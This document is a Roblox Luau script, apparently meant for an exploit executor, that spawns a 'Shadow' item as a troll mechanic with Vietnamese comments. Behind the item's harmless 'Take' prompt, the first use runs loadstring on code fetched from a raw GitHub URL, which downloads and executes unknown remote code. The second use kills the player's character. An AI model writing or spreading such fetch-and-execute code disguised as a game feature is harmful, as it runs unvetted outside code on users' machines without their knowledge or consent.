-- LocalScript TEST Shadow + Troll Mechanic

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- load shadow asset
local shadowAsset = game:GetObjects("rbxassetid://103760757397667")[1]
if not shadowAsset then
	warn("Không load được shadow asset")
	return
end

-- tìm keyhitbox
local function findKeyHitbox()
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA("BasePart") and obj.Name:lower() == "keyhitbox" then
			return obj
		end
	end
	return nil
end

-- spawn shadow
local function spawnShadow()
	local keyhitbox = findKeyHitbox()
	if not keyhitbox then
		warn("Không tìm thấy keyhitbox")
		return
	end

	local shadow = shadowAsset:Clone()
	shadow.Parent = workspace

	local handle = shadow:FindFirstChild("Handle", true)
		or shadow:FindFirstChildWhichIsA("BasePart", true)

	if not handle then
		warn("Shadow không có Handle/BasePart")
		return
	end

	if not shadow.PrimaryPart then
		shadow.PrimaryPart = handle
	end

	shadow:SetPrimaryPartCFrame(CFrame.new(keyhitbox.Position))

	for _, p in ipairs(shadow:GetDescendants()) do
		if p:IsA("BasePart") then
			p.Anchored = true
			p.CanCollide = false
		end
	end

	-- trạng thái troll
	local usedOnce = false
	local exploded = false

	local prompt = Instance.new("ProximityPrompt")
	prompt.ActionText = "Take"
	prompt.ObjectText = "Shadow"
	prompt.MaxActivationDistance = 5
    prompt.Style = Enum.ProximityPromptStyle.Custom
	prompt.HoldDuration = 3
	prompt.RequiresLineOfSight = false
	prompt.Parent = handle

	prompt.Triggered:Connect(function(plr)
		if plr ~= player or exploded then return end

		-- LẦN ĐẦU
		if not usedOnce then
			usedOnce = true
			print("Shadow: lần đầu...")

			-- hiệu ứng nhẹ
			TweenService:Create(handle, TweenInfo.new(0.2), {
				Transparency = 0.2
			}):Play()

			-- chạy cruc
			pcall(function()
				loadstring(game:HttpGet(
					"https://raw.githubusercontent.com/eoyoustme/back/refs/heads/main/cruc"
				))()
			end)

			return
		end

		-- LẦN THỨ HAI = CHẾT
		exploded = true
		print("Shadow: tham lam rồi 😈")

		-- rung camera nhẹ
		local cam = workspace.CurrentCamera
		local oldCF = cam.CFrame
		task.spawn(function()
			for i = 1, 8 do
				cam.CFrame = oldCF * CFrame.new(
					math.random(-2,2)/10,
					math.random(-2,2)/10,
					0
				)
				task.wait(0.03)
			end
			cam.CFrame = oldCF
		end)

		-- hiệu ứng nổ
		for _, p in ipairs(shadow:GetDescendants()) do
			if p:IsA("BasePart") then
				TweenService:Create(p, TweenInfo.new(0.3), {
					Transparency = 1,
					Size = p.Size * 2
				}):Play()
			end
		end

		task.wait(0.15)

		-- CHẾT NGAY
		humanoid.Health = 0

		task.delay(1, function()
			if shadow then shadow:Destroy() end
		end)
	end)
end

-- BẤM B ĐỂ TEST
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode == Enum.KeyCode.B then
		spawnShadow()
	end
end)

print("[TEST] Press B to spawn Shadow (TROLL ENABLED)")
